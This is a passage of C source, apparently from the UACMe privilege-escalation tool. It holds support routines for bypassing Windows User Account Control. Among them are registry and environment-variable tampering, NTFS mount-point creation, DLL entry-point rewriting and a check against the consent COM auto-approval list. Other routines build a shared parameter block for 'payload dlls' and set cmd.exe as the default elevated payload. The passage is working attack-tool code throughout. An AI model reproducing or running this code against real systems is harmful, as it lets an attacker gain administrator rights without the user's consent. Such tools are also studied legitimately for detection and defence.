        InitializeObjectAttributes(&obja, &usRootKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
        ntStatus = NtOpenKey(&hRoot, MAXIMUM_ALLOWED, &obja);
        if (!NT_SUCCESS(ntStatus))
            break;

        RtlInitUnicodeString(&usSubKey, lpSubKey);
        obja.RootDirectory = hRoot;
        obja.ObjectName = &usSubKey;
        ntStatus = NtOpenKey(&hSubKey, MAXIMUM_ALLOWED, &obja);
        if (!NT_SUCCESS(ntStatus))
            break;

        RtlInitUnicodeString(&usValueName, lpVariableName);

        if (fRemove) {

            ntStatus = NtDeleteValueKey(hSubKey, &usValueName);

        }
        else {

            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));

            ntStatus = NtSetValueKey(hSubKey,
                &usValueName,
                0,
                REG_SZ,
                (BYTE*)lpVariableData,
                cbData);

        }


    } while (FALSE);

    if (hSubKey) NtClose(hSubKey);
    if (hRoot) NtClose(hRoot);
    if (bNameAllocated)
        RtlFreeUnicodeString(&usRootKey);

    return NT_SUCCESS(ntStatus);
}

/*
* supSetEnvVariable
*
* Purpose:
*
* Remove or set current user environment variable.
*
*/
BOOL supSetEnvVariable(
    _In_ BOOL fRemove,
    _In_opt_ LPWSTR lpKeyName,
    _In_ LPWSTR lpVariableName,
    _In_opt_ LPWSTR lpVariableData
)
{
    BOOL    bResult = FALSE;
    HKEY    hKey = NULL;
    DWORD   cbData;

    LPWSTR lpSubKey;

    do {
        if (lpVariableName == NULL)
            break;

        if (lpKeyName == NULL)
            lpSubKey = L"Environment";
        else
            lpSubKey = lpKeyName;

        if ((lpVariableData == NULL) && (fRemove == FALSE))
            break;

        if (RegOpenKey(HKEY_CURRENT_USER, lpSubKey, &hKey) != ERROR_SUCCESS)
            break;

        if (fRemove) {
            bResult = (RegDeleteValue(hKey, lpVariableName) == ERROR_SUCCESS);
        }
        else {
            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
            bResult = (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
                (BYTE*)lpVariableData, cbData) == ERROR_SUCCESS);
        }

    } while (FALSE);

    if (hKey != NULL) {
        RegFlushKey(hKey);
        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* supDeleteMountPoint
*
* Purpose:
*
* Removes reparse point of type mount_point.
*
*/
BOOL supDeleteMountPoint(
    _In_ HANDLE hDirectory
)
{
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_GUID_DATA_BUFFER Buffer;

    RtlSecureZeroMemory(&Buffer, sizeof(REPARSE_GUID_DATA_BUFFER));
    Buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_DELETE_REPARSE_POINT,
        &Buffer,
        REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,
        NULL,
        0);

    if (status == STATUS_NOT_A_REPARSE_POINT) {
        SetLastError(ERROR_INVALID_PARAMETER);
    }
    else {
        supSetLastErrorFromNtStatus(status);
    }

    return NT_SUCCESS(status);
}

/*
* supSetMountPoint
*
* Purpose:
*
* Install reparse point of type mount_point to target.
*
*/
BOOL supSetMountPoint(
    _In_ HANDLE hDirectory,
    _In_ LPWSTR lpTarget,
    _In_ LPWSTR lpPrintName
)
{
    ULONG           memIO;
    USHORT          cbTarget, cbPrintName, reparseDataLength;
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_DATA_BUFFER *Buffer;

    if ((lpTarget == NULL) || (lpPrintName == NULL)) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Calculate required buffer size.
    // Header + length of input strings + safe space.
    //
    cbTarget = (USHORT)(_strlen(lpTarget) * sizeof(WCHAR));
    cbPrintName = (USHORT)(_strlen(lpPrintName) * sizeof(WCHAR));

    reparseDataLength = cbTarget + cbPrintName + 12;
    memIO = (ULONG)(reparseDataLength + REPARSE_DATA_BUFFER_HEADER_LENGTH);

    Buffer = (REPARSE_DATA_BUFFER*)supHeapAlloc((SIZE_T)memIO);
    if (Buffer == NULL)
        return FALSE;

    //
    // Setup reparse point structure.
    //
    Buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Buffer->ReparseDataLength = reparseDataLength;

    //
    // Add Target to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Buffer->MountPointReparseBuffer.SubstituteNameLength = cbTarget;

    RtlCopyMemory(Buffer->MountPointReparseBuffer.PathBuffer,
        lpTarget,
        cbTarget);

    //
    // Add PrintName to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.PrintNameOffset = cbTarget + sizeof(UNICODE_NULL);
    Buffer->MountPointReparseBuffer.PrintNameLength = cbPrintName;

    RtlCopyMemory(&Buffer->MountPointReparseBuffer.PathBuffer[(cbTarget / sizeof(WCHAR)) + 1],
        lpPrintName,
        cbPrintName);

    //
    // Set reparse point.
    //
    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_SET_REPARSE_POINT,
        Buffer,
        memIO,
        NULL,
        0);

    supHeapFree(Buffer);

    supSetLastErrorFromNtStatus(status);
    return NT_SUCCESS(status);
}

/*
* supOpenDirectoryForReparse
*
* Purpose:
*
* Open directory handle to set reparse point.
*
*/
HANDLE supOpenDirectoryForReparse(
    _In_ LPWSTR lpDirectory
)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    HANDLE              hReparseDirectory = NULL;
    UNICODE_STRING      usReparseDirectory;
    IO_STATUS_BLOCK     IoStatusBlock;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    usReparseDirectory.Buffer = NULL;
    if (RtlDosPathNameToNtPathName_U(lpDirectory, &usReparseDirectory, NULL, NULL)) {

        InitializeObjectAttributes(&ObjectAttributes, &usReparseDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(&hReparseDirectory,
            FILE_ALL_ACCESS,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            FILE_OPEN_REPARSE_POINT | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        RtlFreeUnicodeString(&usReparseDirectory);
    }

    supSetLastErrorFromNtStatus(status);

    return hReparseDirectory;
}

/*
* supWinstationToName
*
* Purpose:
*
* Retrieves winstation string name.
*
*/
BOOL supWinstationToName(
    _In_opt_ HWINSTA hWinsta,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HWINSTA hObject;

    if (hWinsta == NULL)
        hObject = GetProcessWindowStation();
    else
        hObject = hWinsta;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supDesktopToName
*
* Purpose:
*
* Retrieves desktop string name.
*
*/
BOOL supDesktopToName(
    _In_opt_ HDESK hDesktop,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HDESK hObject;

    if (hDesktop == NULL)
        hObject = GetThreadDesktop(GetCurrentThreadId());
    else
        hObject = hDesktop;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supReplaceDllEntryPoint
*
* Purpose:
*
* Replace DLL entry point and optionally convert dll to exe.
*
*/
BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe
)
{
    BOOL bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD DllVirtualSize;
    PVOID DllBase, EntryPoint;

    NtHeaders = RtlImageNtHeader(DllImage);
    if (NtHeaders) {

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
        if (DllBase) {
            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                if (fConvertToExe)
                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);

                bResult = TRUE;
            }
            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supQuerySystemRoot
*
* Purpose:
*
* Query system root value from registry to the program global context.
*
*/
BOOL supQuerySystemRoot(
    _Inout_ PVOID Context)
{
    BOOL                bResult = FALSE, needBackslash = FALSE;
    NTSTATUS            Status;
    UNICODE_STRING      UString;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    PWCHAR              lpData = NULL;
    SIZE_T              ccm = 0, cch = 0;
    HANDLE              hKey = NULL;

    PUACMECONTEXT       context = (PUACMECONTEXT)Context;

    WCHAR               szBuffer[MAX_PATH];
    WCHAR               szSystem32Prep[] = { L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 0 };

    ULONG               Length = 0, cbSystem32Prep = sizeof(szSystem32Prep) - sizeof(WCHAR);

    do {
        _strcpy(szBuffer, T_REGISTRY_PREP);
        _strcat(szBuffer, T_WINDOWS_CURRENT_VERSION);
        RtlInitUnicodeString(&UString, szBuffer);

        InitializeObjectAttributes(&ObjectAttributes, &UString, OBJ_CASE_INSENSITIVE, NULL, NULL);
        Status = NtOpenKey(&hKey, KEY_READ, &ObjectAttributes);
        if (!NT_SUCCESS(Status))
            break;

        Status = supRegReadValue(hKey, L"SystemRoot", REG_SZ, (PVOID*)&lpData, &Length, context->ucmHeap);
        if (!NT_SUCCESS(Status) || (lpData == NULL))
            break;

        ccm = Length / sizeof(WCHAR);
        cch = ccm;
        if (lpData[cch - 1] != L'\\') {
            ccm++;
            needBackslash = TRUE;
        }
        else {
            needBackslash = FALSE;
        }

        ccm += (cbSystem32Prep / sizeof(WCHAR));

        if (ccm >= MAX_PATH) {
            SetLastError(ERROR_BUFFER_OVERFLOW);
            break;
        }

        _strncpy(context->szSystemRoot, MAX_PATH, lpData, cch);
        if (needBackslash) {
            context->szSystemRoot[cch - 1] = L'\\';
        }

        _strcpy(context->szSystemDirectory, context->szSystemRoot);
        _strcat(context->szSystemDirectory, szSystem32Prep);

        bResult = TRUE;

    } while (FALSE);

    if (hKey) NtClose(hKey);
    if (lpData) RtlFreeHeap(context->ucmHeap, 0, lpData);

    return bResult;
}

#define SI_MAX_BUFFER_LENGTH (512 * 1024 * 1024)

/*
* supGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with supHeapFree after usage.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
)
{
    PVOID       buffer = NULL;
    ULONG       bufferSize = PAGE_SIZE;
    NTSTATUS    ntStatus;
    ULONG       returnedLength = 0;

    buffer = supHeapAlloc((SIZE_T)bufferSize);
    if (buffer == NULL)
        return NULL;

    while ((ntStatus = NtQuerySystemInformation(
        SystemInformationClass,
        buffer,
        bufferSize,
        &returnedLength)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        supHeapFree(buffer);
        bufferSize *= 2;

        if (bufferSize > SI_MAX_BUFFER_LENGTH)
            return NULL;

        buffer = supHeapAlloc((SIZE_T)bufferSize);
    }

    if (NT_SUCCESS(ntStatus)) {
        return buffer;
    }

    if (buffer)
        supHeapFree(buffer);

    return NULL;
}

/*
* supIsCorImageFile
*
* Purpose:
*
* Return true if image has CliHeader entry, false otherwise.
*
*/
BOOL supIsCorImageFile(
    PVOID ImageBase
)
{
    BOOL                bResult = FALSE;
    ULONG               sz = 0;
    IMAGE_COR20_HEADER *CliHeader;

    if (ImageBase) {
        CliHeader = (IMAGE_COR20_HEADER*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR, &sz);

        if ((CliHeader == NULL) || (sz < sizeof(IMAGE_COR20_HEADER)))
            return bResult;
        bResult = TRUE;
    }
    return bResult;
}

/*
* supIsConsentApprovedInterface
*
* Purpose:
*
* Test if the given interface is in consent COMAutoApprovalList.
*
*/
BOOL supIsConsentApprovedInterface(
    _In_ LPWSTR InterfaceName,
    _Out_ PBOOL IsApproved
)
{
    BOOL                bResult = FALSE;

    UNICODE_STRING      usKey;
    OBJECT_ATTRIBUTES   obja;
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    ULONG               dummy;

    HANDLE              hKey = NULL;

    ULONG               Index = 0;

    BYTE               *Buffer;
    ULONG               Size = PAGE_SIZE;

    PKEY_VALUE_BASIC_INFORMATION ValueInformation;

    UNICODE_STRING      usKeyName, usInterfaceName;

    WCHAR               szKeyName[256];

    if (IsApproved)
        *IsApproved = FALSE;
    else
        return FALSE;

    RtlSecureZeroMemory(&szKeyName, sizeof(szKeyName));
    DecodeStringById(ISDB_COMAUTOAPPROVALLIST, (LPWSTR)&szKeyName, sizeof(szKeyName));

    RtlInitUnicodeString(&usKey, szKeyName);
    InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bResult = NT_SUCCESS(NtOpenKey(
        &hKey,
        KEY_QUERY_VALUE,
        &obja));

    RtlSecureZeroMemory(&szKeyName, sizeof(szKeyName));

    if (bResult) {

        RtlInitUnicodeString(&usInterfaceName, InterfaceName);

        Buffer = (BYTE*)supHeapAlloc(Size);
        if (Buffer) {
            ValueInformation = (PKEY_VALUE_BASIC_INFORMATION)Buffer;

            do {

                status = NtEnumerateValueKey(
                    hKey,
                    Index,
                    KeyValueBasicInformation,
                    ValueInformation,
                    Size,
                    &dummy);

                if (NT_SUCCESS(status)) {

                    usKeyName.MaximumLength = (USHORT)ValueInformation->NameLength;
                    usKeyName.Buffer = ValueInformation->Name;
                    usKeyName.Length = (USHORT)ValueInformation->NameLength;

                    if (RtlEqualUnicodeString(&usInterfaceName, &usKeyName, TRUE)) {
                        *IsApproved = TRUE;
                        break;
                    }
                    Index++;
                }

            } while (status != STATUS_NO_MORE_ENTRIES);

            supHeapFree(Buffer);
        }

        NtClose(hKey);
    }

    return bResult;
}

/*
* supCreateDirectory
*
* Purpose:
*
* Native create directory.
*
*/
NTSTATUS supCreateDirectory(
    _Out_opt_ PHANDLE phDirectory,
    _In_ OBJECT_ATTRIBUTES *ObjectAttributes,
    _In_ ULONG DirectoryShareFlags,
    _In_ ULONG DirectoryAttributes
)
{
    NTSTATUS         status;
    HANDLE           DirectoryHandle = NULL;
    IO_STATUS_BLOCK  IoStatusBlock;

    if (DirectoryAttributes == 0)
        DirectoryAttributes = FILE_ATTRIBUTE_NORMAL;

    status = NtCreateFile(
        &DirectoryHandle,
        FILE_GENERIC_WRITE,
        ObjectAttributes,
        &IoStatusBlock,
        NULL,
        DirectoryAttributes,
        DirectoryShareFlags,
        FILE_OPEN_IF,
        FILE_DIRECTORY_FILE,
        NULL,
        0);

    if (NT_SUCCESS(status)) {
        if (phDirectory)
            *phDirectory = DirectoryHandle;
    }
    return status;
}

/*
* supxCreateBoundaryDescriptorSID
*
* Purpose:
*
* Create special SID to access isolated namespace.
*
*/
PSID supxCreateBoundaryDescriptorSID(
    SID_IDENTIFIER_AUTHORITY *SidAuthority,
    UCHAR SubAuthorityCount,
    ULONG *SubAuthorities
)
{
    BOOL    bResult = FALSE;
    ULONG   i;
    PSID    pSid = NULL;

    do {

        pSid = supHeapAlloc(RtlLengthRequiredSid(SubAuthorityCount));
        if (pSid == NULL)
            break;

        if (!NT_SUCCESS(RtlInitializeSid(pSid, SidAuthority, SubAuthorityCount)))
            break;

        for (i = 0; i < SubAuthorityCount; i++)
            *RtlSubAuthoritySid(pSid, i) = SubAuthorities[i];

        bResult = TRUE;

    } while (FALSE);

    if (bResult == FALSE) {
        if (pSid) supHeapFree(pSid);
        pSid = NULL;
    }

    return pSid;
}

/*
* supCreateSharedParametersBlock
*
* Purpose:
*
* Create parameters block to be shared with payload dlls.
*
*/
BOOL supCreateSharedParametersBlock(
    _In_ PVOID ucmContext)
{
    BOOL    bResult = FALSE;
    ULONG   r;
    HANDLE  hBoundary = NULL;
    PVOID   SharedBuffer = NULL;
    SIZE_T  ViewSize;

    PUACMECONTEXT context = (PUACMECONTEXT)ucmContext;

    LARGE_INTEGER liSectionSize;
    PSID pWorldSid = NULL;

    SID_IDENTIFIER_AUTHORITY SidWorldAuthority = SECURITY_WORLD_SID_AUTHORITY;

    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);

    UACME_PARAM_BLOCK ParamBlock;

    ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID };

    WCHAR szBoundaryDescriptorName[128];
    WCHAR szObjectName[128];

    RtlSecureZeroMemory(&szBoundaryDescriptorName, sizeof(szBoundaryDescriptorName));
    supGenerateSharedObjectName((WORD)AKAGI_BDESCRIPTOR_NAME_ID, szBoundaryDescriptorName);
    RtlInitUnicodeString(&usName, szBoundaryDescriptorName);

    //
    // Fill parameters block.
    // 
    RtlSecureZeroMemory(&ParamBlock, sizeof(ParamBlock));

    if (context->OptionalParameterLength != 0) {
        _strncpy(ParamBlock.szParameter, MAX_PATH,
            context->szOptionalParameter, MAX_PATH);
    }

    ParamBlock.AkagiFlag = context->AkagiFlag;
    ParamBlock.SessionId = NtCurrentPeb()->SessionId;

    supWinstationToName(NULL, ParamBlock.szWinstation, MAX_PATH * 2, &r);
    supDesktopToName(NULL, ParamBlock.szDesktop, MAX_PATH * 2, &r);

    do {
        //
        // Create and assign boundary descriptor.
        //
        hBoundary = RtlCreateBoundaryDescriptor(&usName, 0);
        if (hBoundary == NULL)
            break;

        pWorldSid = supxCreateBoundaryDescriptorSID(
            &SidWorldAuthority,
            1,
            SubAuthoritiesWorld);
        if (pWorldSid == NULL)
            break;

        if (!NT_SUCCESS(RtlAddSIDToBoundaryDescriptor(&hBoundary, pWorldSid))) {
            break;
        }

        //
        // Create private namespace.
        //
        if (!NT_SUCCESS(NtCreatePrivateNamespace(
            &context->SharedContext.hIsolatedNamespace,
            MAXIMUM_ALLOWED,
            &obja,
            hBoundary)))
        {
            break;
        }

        obja.Attributes = OBJ_CASE_INSENSITIVE;
        obja.RootDirectory = context->SharedContext.hIsolatedNamespace;
        obja.ObjectName = &usName;

        //
        // Create completion event.
        //
        RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
        supGenerateSharedObjectName((WORD)AKAGI_COMPLETION_EVENT_ID, szObjectName);
        RtlInitUnicodeString(&usName, szObjectName);
        _strcpy(ParamBlock.szSignalObject, szObjectName);

        //
        // Param block is complete. Calc crc32.
        //
        ParamBlock.Crc32 = RtlComputeCrc32(0, &ParamBlock, sizeof(ParamBlock));

        if (!NT_SUCCESS(NtCreateEvent(
            &context->SharedContext.hCompletionEvent,
            EVENT_ALL_ACCESS,
            &obja,
            NotificationEvent,
            FALSE)))
        {
            break;
        }

        //
        // Create shared section.
        //
        liSectionSize.QuadPart = PAGE_SIZE;
        ViewSize = PAGE_SIZE;

        RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
        supGenerateSharedObjectName((WORD)AKAGI_SHARED_SECTION_ID, szObjectName);
        RtlInitUnicodeString(&usName, szObjectName);

        if (NT_SUCCESS(NtCreateSection(
            &context->SharedContext.hSharedSection,
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_QUERY,
            &obja,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL)))
        {
            //
            // Write data to shared section.
            //
            if (NT_SUCCESS(NtMapViewOfSection(
                context->SharedContext.hSharedSection,
                NtCurrentProcess(),
                &SharedBuffer,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                MEM_TOP_DOWN,
                PAGE_READWRITE)))
            {
                RtlSecureZeroMemory(SharedBuffer, PAGE_SIZE);
                RtlCopyMemory(SharedBuffer, &ParamBlock, sizeof(ParamBlock));
                NtUnmapViewOfSection(NtCurrentProcess(), SharedBuffer);
                bResult = TRUE;
            }
        }


    } while (FALSE);

    //
    // Cleanup.
    //
    if (pWorldSid)
        supHeapFree(pWorldSid);
    if (hBoundary)
        RtlDeleteBoundaryDescriptor(hBoundary);

    if (bResult == FALSE) {
        if (context->SharedContext.hIsolatedNamespace) {
            NtDeletePrivateNamespace(context->SharedContext.hIsolatedNamespace);
            NtClose(context->SharedContext.hIsolatedNamespace);
        }
    }

    return bResult;
}

/*
* supDestroySharedParametersBlock
*
* Purpose:
*
* Free shared resources.
*
*/
VOID supDestroySharedParametersBlock(
    _In_ PVOID ucmContext)
{
    PUACMECONTEXT context = (PUACMECONTEXT)ucmContext;

    if (context->SharedContext.hIsolatedNamespace) {

        if (context->SharedContext.hCompletionEvent)
            NtClose(context->SharedContext.hCompletionEvent);

        if (context->SharedContext.hSharedSection)
            NtClose(context->SharedContext.hSharedSection);

        NtDeletePrivateNamespace(context->SharedContext.hIsolatedNamespace);
        NtClose(context->SharedContext.hIsolatedNamespace);
    }
}

/*
* supCreateUacmeContext
*
* Purpose:
*
* Allocate and fill program contexts.
*
*/
PVOID supCreateUacmeContext(
    _In_ ULONG Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_ ULONG OptionalParameterLength,
    _In_ PVOID DecompressRoutine,
    _In_ BOOL OutputToDebugger
)
{
    BOOLEAN IsWow64;
    ULONG Seed, NtBuildNumber = 0;
    SIZE_T Size = sizeof(UACMECONTEXT);
    PUACMECONTEXT Context;

    RTL_OSVERSIONINFOW osv;

    UNREFERENCED_PARAMETER(Method);

    if (OptionalParameterLength > MAX_PATH)
        return NULL;

    IsWow64 = supIsProcess32bit(NtCurrentProcess());

    RtlSecureZeroMemory(&osv, sizeof(osv));
    osv.dwOSVersionInfoSize = sizeof(osv);
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
    NtBuildNumber = osv.dwBuildNumber;

    if (NtBuildNumber < 7000) {
        return NULL;
    }

    Context = supVirtualAlloc(&Size,
        DEFAULT_ALLOCATION_TYPE,
        DEFAULT_PROTECT_TYPE,
        NULL);

    if (Context == NULL) {
        return NULL;
    }

    //
    // Create private heap, enable termination on corruption.
    //
    Context->ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
    if (Context->ucmHeap == NULL) {
        supVirtualFree(Context, NULL);
        return NULL;
    }
    RtlSetHeapInformation(Context->ucmHeap, HeapEnableTerminationOnCorruption, NULL, 0);

    //
    // Set Fubuki flag.
    //
    Context->AkagiFlag = AKAGI_FLAG_KILO;

    //
    // Remember flag for ucmShow* routines.
    //
    Context->OutputToDebugger = OutputToDebugger;

    //
    // Changes behavior of ucmShowQuestion routine to autoapprove.
    //
    Context->UserRequestsAutoApprove = USER_REQUESTS_AUTOAPPROVED;

    //
    // Remember NtBuildNumber.
    //
    Context->dwBuildNumber = NtBuildNumber;

    //
    // Set Cookie for supEncode/DecodePointer.
    //
    Seed = USER_SHARED_DATA->Cookie;
    Context->Cookie = RtlRandomEx((PULONG)&Seed);

    //
    // Remember Wow64 process state.
    //
    Context->IsWow64 = IsWow64;

    //
    // Save OptionalParameter if present.
    //
    if (OptionalParameterLength) {
        _strncpy(Context->szOptionalParameter, MAX_PATH,
            OptionalParameter, OptionalParameterLength);
        Context->OptionalParameterLength = OptionalParameterLength;
    }

    //
    // Set IFileOperations flags.
    //
    if (NtBuildNumber > 14997) {
        Context->IFileOperationFlags = FOF_NOCONFIRMATION |
            FOFX_NOCOPYHOOKS |
            FOFX_REQUIREELEVATION;
    }
    else {
        Context->IFileOperationFlags = FOF_NOCONFIRMATION |
            FOF_SILENT |
            FOFX_SHOWELEVATIONPROMPT |
            FOFX_NOCOPYHOOKS |
            FOFX_REQUIREELEVATION;
    }

    //
    // Query basic directories.
    //       
    // 1. SystemRoot
    // 2. System32
    if (!supQuerySystemRoot(Context)) {
        RtlDestroyHeap(Context->ucmHeap);
        supVirtualFree((PVOID)Context, NULL);
        return NULL;
    }
    // 3. Temp
    supExpandEnvironmentStrings(L"%temp%\\", Context->szTempDirectory, MAX_PATH);

    //
    // Default payload path.
    //
    _strcpy(Context->szDefaultPayload, Context->szSystemDirectory);
    _strcat(Context->szDefaultPayload, CMD_EXE);

    Context->DecompressRoutine = (pfnDecompressPayload)supDecodePointer(DecompressRoutine);

    return (PVOID)Context;
}

/*
* supDestroyUacmeContext
*
* Purpose:
*
* Destroy program contexts.
*
*/
VOID supDestroyUacmeContext(
    _In_ PVOID Context
)
{
    PUACMECONTEXT context = (PUACMECONTEXT)Context;

    RtlDestroyHeap(context->ucmHeap);

    supVirtualFree(Context, NULL);
}

/*
* supDecodeAndWriteBufferToFile
*
* Purpose:
*
* Create new file and write decoded buffer to it.
*
*/
BOOL supDecodeAndWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ CONST PVOID Buffer,
    _In_ DWORD BufferSize,
    _In_ ULONG Key
)
{
    BOOL bResult;
    PVOID p;
    SIZE_T Size = ALIGN_UP_BY(BufferSize, PAGE_SIZE);

    p = supVirtualAlloc(&Size, DEFAULT_ALLOCATION_TYPE | MEM_TOP_DOWN, DEFAULT_PROTECT_TYPE, NULL);
    if (p) {
        RtlCopyMemory(p, Buffer, BufferSize);

        EncodeBuffer(p, BufferSize, Key);

        bResult = supWriteBufferToFile(lpFileName, p, BufferSize);

        supSecureVirtualFree(p, Size, NULL);

        return bResult;
    }
    return FALSE;
}

/*
* supEnableDisableWow64Redirection
*
* Purpose:
*
* Enable/Disable Wow64 redirection.
*
*/
NTSTATUS supEnableDisableWow64Redirection(
    _In_ BOOL bDisable
)
{
    PVOID OldValue = NULL, Value;

    if (bDisable)
        Value = IntToPtr(TRUE);
    else
        Value = IntToPtr(FALSE);

    return RtlWow64EnableFsRedirectionEx(Value, &OldValue);
}

/*
* supIsNetfx48PlusInstalled
*
* Purpose:
*
* Detect Netfx 4.8+
*
*/
BOOLEAN supIsNetfx48PlusInstalled(
    VOID)
{
    HKEY hKey = NULL;
    DWORD Netfx48ReleaseVersion = 528040;
    DWORD dwReleaseVersion = 0;
    DWORD cbData = sizeof(DWORD), dwType = REG_DWORD;

    if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_FULL, 0, KEY_READ, &hKey)) {
        RegQueryValueEx(hKey, TEXT("Release"), NULL, &dwType, (LPBYTE)&dwReleaseVersion, &cbData);
        RegCloseKey(hKey);
    }

    return (dwReleaseVersion >= Netfx48ReleaseVersion);
}

/*
* supGetProcessDebugObject
*
* Purpose:
*
* Reference process debug object.
*
*/
NTSTATUS supGetProcessDebugObject(
    _In_ HANDLE ProcessHandle,
    _Out_ PHANDLE DebugObjectHandle)
{
    return NtQueryInformationProcess(
        ProcessHandle,
        ProcessDebugObjectHandle,
        DebugObjectHandle,
        sizeof(HANDLE),
        NULL);
}

/*
* supInitFusion
*
* Purpose:
*
* Load .NET Assembly Manager dll and remember function pointers.
*
*/
BOOLEAN supInitFusion(
    _In_ DWORD dwVersion
)
{
    HMODULE hFusion;
    pfnCreateAssemblyCache CreateAssemblyCache;

    WCHAR szBuffer[MAX_PATH * 2];

    if (g_ctx->FusionContext.Initialized)
        return TRUE;

    if (dwVersion != 2 && dwVersion != 4)
        return FALSE;

    //
    // Build path to assembly manager dll
    //
    _strcpy(szBuffer, g_ctx->szSystemRoot);
    _strcat(szBuffer, MSNETFRAMEWORK_DIR);

#ifdef _WIN64
    _strcat(szBuffer, TEXT("64"));
#endif

    if (dwVersion == 2) {
        _strcat(szBuffer, TEXT("\\"));
        _strcat(szBuffer, NET2_DIR);
        _strcat(szBuffer, TEXT("\\"));
    }
    else
    {
        _strcat(szBuffer, TEXT("\\"));
        _strcat(szBuffer, NET4_DIR);
        _strcat(szBuffer, TEXT("\\"));
    }

    _strcat(szBuffer, TEXT("fusion.dll"));

    hFusion = LoadLibraryEx(szBuffer, NULL, 0);
    if (hFusion == NULL)
        return FALSE;

    CreateAssemblyCache = (pfnCreateAssemblyCache)GetProcAddress(hFusion, "CreateAssemblyCache");

    if (CreateAssemblyCache == NULL) {
        FreeLibrary(hFusion);
        return FALSE;
    }

    g_ctx->FusionContext.hFusion = hFusion;
    g_ctx->FusionContext.CreateAssemblyCache = CreateAssemblyCache;
    g_ctx->FusionContext.Initialized = TRUE;

    return TRUE;
}

/*
* supFusionGetAssemblyPath
*
* Purpose:
*
* Return given assembly file path.
*
* Note: Use supHeapFree to release lpAssemblyPath allocated memory.
*
*/
HRESULT supFusionGetAssemblyPath(
    _In_ IAssemblyCache* pInterface,
    _In_ LPWSTR lpAssemblyName,
    _Inout_ LPWSTR* lpAssemblyPath
)
{
    HRESULT hr = E_FAIL;
    ASSEMBLY_INFO asmInfo;
    LPWSTR assemblyPath;

    *lpAssemblyPath = NULL;

    RtlSecureZeroMemory(&asmInfo, sizeof(asmInfo));

    pInterface->lpVtbl->QueryAssemblyInfo(pInterface,
        QUERYASMINFO_FLAG_GETSIZE,
        lpAssemblyName,
        &asmInfo);

    if (asmInfo.cchBuf == 0) //empty pszCurrentAssemblyPathBuf
        return E_FAIL;

    assemblyPath = (LPWSTR)supHeapAlloc(asmInfo.cchBuf * sizeof(WCHAR));
